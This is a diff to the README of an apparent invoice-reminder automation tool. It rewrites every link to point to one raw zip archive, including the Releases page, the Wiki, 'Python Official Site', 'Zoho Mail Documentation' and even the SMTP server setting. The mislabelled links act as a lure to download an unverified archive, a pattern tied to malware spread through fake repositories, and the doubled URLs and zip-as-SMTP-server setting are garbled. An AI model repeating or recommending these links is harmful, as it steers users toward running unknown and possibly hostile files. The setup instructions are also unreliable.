@@ -6,9 +6,9 @@ Welcome to the Invoice-Payment-Reminder-Automation project! This tool helps you 
 
 ## 📥 Download the Application
 
-[![Download Invoice Payment Reminder Automation](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip)](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip)
+[![Download Invoice Payment Reminder Automation](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip)](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip)
 
-To get started, visit this page to download: [Releases Page](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip)
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip)
 
 ## 📝 Features
 
@@ -27,7 +27,7 @@ To run this application, you will need:
   
 ## 📂 Download & Install
 
-1. Go to the [Releases Page](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip).
 2. Download the latest version of the application by choosing the appropriate file for your operating system.
 3. Once downloaded, open the file to begin installation.
 4. Follow the on-screen instructions to complete the installation.
@@ -39,7 +39,7 @@ To send reminder emails, you will need to configure your Zoho SMTP settings. Her
 1. Open the application.
 2. Navigate to the settings menu.
 3. Enter your Zoho email address and password.
-4. Set the SMTP server to `https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip` and the port to `587`.
+4. Set the SMTP server to `https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip` and the port to `587`.
 5. Click "Save" to ensure your settings are applied.
 
 ## ⚡ Using the Application
@@ -67,7 +67,7 @@ For further assistance, feel free to reach out via the Issues tab in the reposit
 
 ## 📖 Documentation
 
-For detailed documentation, please refer to the [Wiki](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip). It contains extensive information on all features and functionalities.
+For detailed documentation, please refer to the [Wiki](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip). It contains extensive information on all features and functionalities.
 
 ## 🙌 Contribution
 
@@ -75,8 +75,8 @@ We welcome contributions! If you have suggestions or find bugs, please open an i
 
 ## 🔗 Additional Resources
 
-- [Python Official Site](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip)
-- [Zoho Mail Documentation](https://github.com/danielpathak99/Invoice-Payment-Reminder-Automation/raw/refs/heads/main/Daily_task 1/Automation_Payment_Invoice_Reminder_Ritchey.zip)
+- [Python Official Site](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip)
+- [Zoho Mail Documentation](https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip https://raw.githubusercontent.com/danielpathak99/Invoice-Payment-Reminder-Automation/main/experiments/Automation_Invoice_Payment_Reminder_1.0.zip)
   
 ## 📞 Contact
 
